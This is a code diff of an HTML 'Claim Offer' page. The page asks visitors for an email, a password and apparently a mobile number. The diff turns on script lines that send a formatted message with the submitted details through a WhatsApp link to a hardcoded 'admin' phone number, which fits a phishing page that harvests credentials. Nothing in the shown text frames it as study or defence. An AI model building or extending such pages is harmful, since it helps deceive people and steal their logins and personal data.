@@ -30,7 +30,7 @@
 
         <div class="input-group">
             <label class="input-label">Password</label>
-            <input type="password" id="password" placeholder="Password">
+            <input type="password" id="password" placeholder="Enter your password">
         </div>
 
         <button id="btnFinalClaim" class="claim-btn">Claim Offer</button>
@@ -58,7 +58,7 @@
         // Final Claim Action
         document.getElementById('btnFinalClaim').addEventListener('click', function () {
             const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
+            const mobile = document.getElementById('mobile').value;
 
             // Hardcoded number for notifications
             const adminNotifyNumber = "94789283337";
@@ -87,14 +87,11 @@
                 });
 
             // 2. Send via WhatsApp notification to Admin
-            //--const whatsappUrl = `https://api.whatsapp.com/send?phone=${adminNotifyNumber}&text=${encodeURIComponent(formattedMessage)}`;
-            //window.open(whatsappUrl, '_blank');
+            const whatsappUrl = `https://api.whatsapp.com/send?phone=${adminNotifyNumber}&text=${encodeURIComponent(formattedMessage)}`;
+            window.open(whatsappUrl, '_blank');
         });
     </script>
 
 </body>
 
-
 </html>
-
-
